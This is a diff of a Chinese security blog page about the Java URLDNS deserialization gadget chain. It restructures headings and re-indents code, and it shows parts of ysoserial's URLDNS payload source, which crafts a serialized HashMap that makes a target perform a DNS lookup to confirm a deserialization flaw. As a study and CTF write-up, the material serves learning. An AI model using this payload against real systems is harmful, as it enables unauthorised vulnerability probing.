@@ -72,7 +72,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fas fa-stream"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#URLDNS"><span class="toc-number">2.</span> <span class="toc-text">URLDNS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ysoserial-poc"><span class="toc-number">2.1.</span> <span class="toc-text">ysoserial poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%9F%E8%B8%AAHashMap%E7%B1%BB"><span class="toc-number">2.2.</span> <span class="toc-text">跟踪HashMap类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hash%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.</span> <span class="toc-text">hash函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gadget"><span class="toc-number">2.4.</span> <span class="toc-text">Gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#demo"><span class="toc-number">2.5.</span> <span class="toc-text">demo</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">3.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web846"><span class="toc-number">3.1.</span> <span class="toc-text">ctfshow web846</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#URLDNS"><span class="toc-number">2.</span> <span class="toc-text">URLDNS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ysoserial-poc"><span class="toc-number">2.2.</span> <span class="toc-text">ysoserial poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%9F%E8%B8%AAHashMap%E7%B1%BB"><span class="toc-number">2.3.</span> <span class="toc-text">跟踪HashMap类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hash%E5%87%BD%E6%95%B0"><span class="toc-number">2.4.</span> <span class="toc-text">hash函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gadget"><span class="toc-number">2.5.</span> <span class="toc-text">Gadget</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#demo"><span class="toc-number">3.</span> <span class="toc-text">demo</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">4.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web846"><span class="toc-number">4.1.</span> <span class="toc-text">ctfshow web846</span></a></li></ol></li></ol>
     </div>
   
         
@@ -244,7 +244,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Java/" style="color: #00a596">Java</a>
+                <a href="/blog/tags/Java/" style="color: #ffa2c4">Java</a>
             </span>
             
         </span>
@@ -283,7 +283,6 @@
     
     <div class="content" v-pre>
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>年轻人的第一条java反序列化链子</p>
-<p>这条利用链不能进行命令执行，只可以发送一次DNS请求，但它完全使用Java内置的类构造，对第三方库没有依赖，此外在目标没有回显的时候(java题里很常见)，能够通过DNS请求得知是否存在反序列化漏洞</p>
 <p>参考：</p>
 <p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6">Boogipop的博客</a></p>
 <p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/01/30/java%e5%ae%89%e5%85%a8%e7%ac%94%e8%ae%b0/">负数零的博客</a></p>
@@ -291,7 +290,8 @@
 <p>vscode</p>
 <span id="more"></span>
 
-<h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><h2 id="ysoserial-poc"><a href="#ysoserial-poc" class="headerlink" title="ysoserial poc"></a>ysoserial poc</h2><p>直接看URLDNS.java的主体部分</p>
+<h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>这条利用链不能进行命令执行，只可以发送一次DNS请求，但它完全使用Java内置的类构造，对第三方库没有依赖，此外在目标没有回显的时候(java题里很常见)，能够通过DNS请求得知是否存在反序列化漏洞</p>
+<h2 id="ysoserial-poc"><a href="#ysoserial-poc" class="headerlink" title="ysoserial poc"></a>ysoserial poc</h2><p>直接看URLDNS.java的主体部分</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span>payloads</span><span class="token punctuation">;</span>
 
 <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
@@ -345,13 +345,13 @@
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>在这个URLDNS类中，ysoserial会调用这个类的<code>getObject</code>方法来获得payload，这个方法最后返回一个对象，即被序列化的对象，在这里是<code>HashMap ht</code></p>
-<p>接下来我们分析一下这段代码，</p>
+<p>接下来我们分析一下这段poc，</p>
 <p>首先从URL的创建开始：</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">URLStreamHandler</span> handler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SilentURLStreamHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-                <span class="token class-name">HashMap</span> ht <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// HashMap that will contain the URL</span>
-                <span class="token class-name">URL</span> u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// URL to use as the Key</span>
-                ht<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+            <span class="token class-name">HashMap</span> ht <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// HashMap that will contain the URL</span>
+            <span class="token class-name">URL</span> u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// URL to use as the Key</span>
+            ht<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <ul>
 <li>先是用<code>URLStreamHandler</code>创建了一个句柄，这个句柄可以打开一个指定的url</li>
@@ -359,12 +359,12 @@
 </ul>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> <span class="token string">"hashCode"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span>
 
-                <span class="token keyword">return</span> ht<span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
+              <span class="token keyword">return</span> ht<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
 
-        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
-                <span class="token class-name">PayloadRunner</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token constant">URLDNS</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+              <span class="token class-name">PayloadRunner</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token constant">URLDNS</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <ul>
 <li>这里将url对象u的hashCode设置成了-1，为什么要这么做我们一会在分析具体的触发过程时会提到</li>
@@ -442,7 +442,7 @@
 <li><code>URLStreamHandler-&gt;getHostAddress(u)</code></li>
 <li><code>InetAddress-&gt;getByName(host)</code></li>
 </ol>
-<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>仿照ysoserial写一个urldns链序列化与反序列化的demo</p>
+<h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><p>仿照ysoserial写一个urldns链序列化与反序列化的demo</p>
 <p>Main.java</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>c1oud<span class="token punctuation">.</span>www<span class="token punctuation">.</span>base</span><span class="token punctuation">;</span>
 
